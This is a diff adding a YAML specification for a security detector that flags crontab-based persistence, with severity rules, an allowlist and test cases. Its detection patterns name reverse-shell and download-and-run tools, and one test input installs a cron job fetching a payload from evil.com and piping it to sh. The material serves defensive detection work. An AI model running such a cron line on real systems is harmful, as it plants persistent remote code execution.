@@ -1,0 +1,81 @@
+kind: detector
+name: crontab_persistence
+version: 1
+description: "Detects crontab modifications for persistence via file writes and commands"
+
+context: |
+  Attackers install crontab entries to maintain persistence. This detector
+  catches two patterns:
+  1. File writes to cron directories (/var/spool/cron/, /etc/cron.d/, etc.)
+  2. Commands that modify crontab (crontab -e, echo >> cron, pipe to crontab -)
+
+  Severity:
+  - High for standard crontab modifications
+  - Critical when command contains suspicious content (curl|sh, base64 -d,
+    /dev/tcp, nc -e, bash -i, etc.)
+
+  Key decisions:
+  - Allowlisted processes: cron, anacron, logrotate, apt, dpkg, yum, dnf, rpm.
+  - Suspicious content check uses paired patterns (curl + |sh) and single
+    patterns (/dev/tcp, base64 -d, python -c, nc -e).
+  - Bare "crontab" command (no args) triggers because eBPF execve may
+    capture just the binary without args when piped via stdin.
+
+behavior:
+  does:
+    - "Fires High on file writes to cron directories"
+    - "Fires High on crontab -e, crontab -, echo >> cron commands"
+    - "Escalates to Critical when command has suspicious content (download+execute, reverse shell)"
+    - "Per-(path,comm) or (comm,pid) cooldown"
+  does_not:
+    - "Alert on allowlisted processes (cron, anacron, logrotate, apt, dpkg)"
+    - "Alert on file writes to non-cron paths"
+    - "Alert on non-crontab commands (ls, cat /etc/crontab)"
+    - "Re-alert within cooldown"
+
+config:
+  cooldown_secs: 300
+
+dependencies: []
+
+test_cases:
+  true_positives:
+    - description: "File write to /var/spool/cron/crontabs/root"
+      input:
+        kind: "file.write_access"
+        path: "/var/spool/cron/crontabs/root"
+        comm: "vi"
+      expected:
+        alert: true
+        severity: "high"
+
+    - description: "curl|sh piped to crontab"
+      input:
+        kind: "shell.command_exec"
+        command: "echo '* * * * * curl http://evil.com/payload|sh' | crontab -"
+        comm: "bash"
+      expected:
+        alert: true
+        severity: "critical"
+
+  true_negatives:
+    - description: "cron writing to its own spool (allowlisted)"
+      input:
+        kind: "file.write_access"
+        path: "/var/spool/cron/crontabs/root"
+        comm: "cron"
+      expected:
+        alert: false
+        reason: "cron is in ALLOWED_PROCESSES"
+
+    - description: "cat /etc/crontab (reading, not modifying)"
+      input:
+        kind: "shell.command_exec"
+        command: "cat /etc/crontab"
+        comm: "cat"
+      expected:
+        alert: false
+        reason: "cat is not a crontab modification command"
+
+history:
+  - "2026-04-02: initial spec from source code analysis"
